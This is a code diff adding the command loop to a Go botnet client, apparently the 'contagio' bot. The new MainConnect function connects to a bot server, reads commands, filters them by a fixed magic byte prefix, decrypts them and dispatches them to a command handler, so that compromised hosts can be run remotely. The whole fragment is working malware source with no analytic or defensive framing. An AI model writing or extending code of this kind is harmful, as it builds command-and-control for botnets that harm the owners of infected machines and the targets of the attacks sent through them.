@@ -1,12 +1,63 @@
 package main
 
 import (
+	"bytes"
 	"contagio/bot/config"
 	"contagio/bot/methods"
 	"fmt"
 	"net"
 	"time"
 )
+
+func MainConnect() {
+
+	if config.DEBUG {
+		fmt.Println("[main] Сonnecting to the bot server...")
+	}
+
+	connection, err := Connect()
+	if err != nil || connection == nil {
+		time.Sleep(1 * time.Second)
+		return
+	}
+
+	if config.DEBUG {
+		fmt.Println("[main] Connected to the bot server!")
+	}
+	for {
+
+		command := make([]byte, 2000)
+
+		n, err := connection.Read(command)
+		if err != nil {
+			return
+		}
+
+		if len(command[:n]) < 5 {
+			continue
+		}
+
+		if bytes.HasPrefix(command, []byte{0, 0, 0, 0, 0, 0, 0, 0, 0, 0}) { // null command
+			continue
+		}
+
+		if !bytes.HasPrefix(command, []byte{255, 255, 10, 29, 49, 19, 10, 12, 44, 202}) {
+			continue
+		}
+
+		cmd := Decrypt(command[:n])
+
+		if cmd == "" { // error
+			if config.DEBUG {
+				fmt.Println("Decrypt error")
+			}
+			continue
+		}
+
+		CommandHandler(cmd)
+	}
+
+}
 
 func Connect() (connection net.Conn, err error) {
 	defer methods.Catch()
